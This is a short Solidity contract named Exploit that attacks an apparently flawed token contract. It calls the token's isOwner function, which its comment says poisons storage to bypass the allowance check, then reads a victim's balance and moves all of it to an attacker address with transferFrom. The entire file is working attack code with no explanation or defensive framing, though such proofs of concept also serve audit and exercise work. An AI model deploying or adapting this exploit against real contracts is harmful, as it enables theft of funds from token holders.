// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function isOwner(address a) external;
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit {
    IToken public token;
    address public victim;
    address public attacker;

    constructor(address _token, address _victim, address _attacker) {
        token = IToken(_token);
        victim = _victim;
        attacker = _attacker;
    }

    function execute() external {
        // Step 1: Trigger isOwner to poison storage and bypass _spendAllowance
        token.isOwner(attacker);

        // Step 2: Get victim balance and drain it
        uint256 amount = token.balanceOf(victim);
        token.transferFrom(victim, attacker, amount);
    }
}
